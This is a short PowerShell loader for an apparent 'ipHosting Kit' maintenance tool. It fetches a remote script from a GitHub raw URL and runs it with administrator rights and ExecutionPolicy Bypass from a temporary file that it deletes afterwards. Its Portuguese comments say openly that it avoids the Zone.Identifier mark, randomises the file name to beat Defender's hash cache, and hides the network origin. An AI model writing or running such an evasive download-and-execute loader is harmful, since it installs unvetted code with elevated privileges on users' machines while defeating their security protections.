# ipHosting Kit - Loader
$url = 'https://raw.githubusercontent.com/henriqueguape-max/iphosting-kit/main/ipHosting-Manutencao.ps1'

Write-Progress -Activity "Baixando ipHosting Kit..." -Status "Aguarde"
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

try {
    $content = Invoke-RestMethod $url
} catch {
    Write-Host "Erro ao baixar o script: $_" -ForegroundColor Red
    return
}
Write-Progress -Activity "Baixando ipHosting Kit..." -Completed

# Grava no disco via Set-Content (sem Zone.Identifier — arquivo parece local)
# GUID unico por execucao evita cache de hash do Defender
$id  = [Guid]::NewGuid().Guid
$tmp = "$env:TEMP\iphosting_$id.ps1"
Set-Content -Path $tmp -Value "# $id`r`n$content" -Encoding UTF8

# Roda via CMD -> PowerShell (contexto de processo limpo, sem historico de rede)
Start-Process cmd -ArgumentList "/c powershell -NoProfile -ExecutionPolicy Bypass -File `"$tmp`" & timeout /t 5 /nobreak > nul & del `"$tmp`"" -Verb RunAs
